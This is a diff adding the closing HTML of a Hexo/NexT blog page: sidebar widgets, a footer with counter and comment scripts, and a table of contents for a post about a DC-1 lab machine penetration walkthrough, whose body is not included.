+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">33</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.ak6666.top/" title="http://blog.ak6666.top/" rel="noopener" target="_blank">阿凯</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=536976917&auto=1&height=32"></iframe>
+
+
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#靶机渗透记录—DC-1"><span class="nav-number">1.</span> <span class="nav-text">靶机渗透记录—DC-1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#下载地址"><span class="nav-number">1.1.</span> <span class="nav-text">下载地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#靶机描述"><span class="nav-number">1.2.</span> <span class="nav-text">靶机描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#打开靶机"><span class="nav-number">1.3.</span> <span class="nav-text">打开靶机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信息搜集"><span class="nav-number">1.4.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Msf-Getshell"><span class="nav-number">1.5.</span> <span class="nav-text">Msf Getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第一个FLAG"><span class="nav-number">1.6.</span> <span class="nav-text">第一个FLAG</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第二个FLAG"><span class="nav-number">1.7.</span> <span class="nav-text">第二个FLAG</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第三个FLAG"><span class="nav-number">1.8.</span> <span class="nav-text">第三个FLAG</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第四个FLAG"><span class="nav-number">1.9.</span> <span class="nav-text">第四个FLAG</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第五个FLAG"><span class="nav-number">1.10.</span> <span class="nav-text">第五个FLAG</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.11.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div> 
+   
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.1</div>
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<span id="busuanzi_container_site_pv">
+    <br>本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.1"></script>
+
+  <script src="/js/motion.js?v=7.1.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.1"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.1"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.1"></script>
+<script src="/js/post-details.js?v=7.1.1"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    <script>
+  window.livereOptions = {
+    refer: '2020/05/26/靶机渗透记录—DC-1/'
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
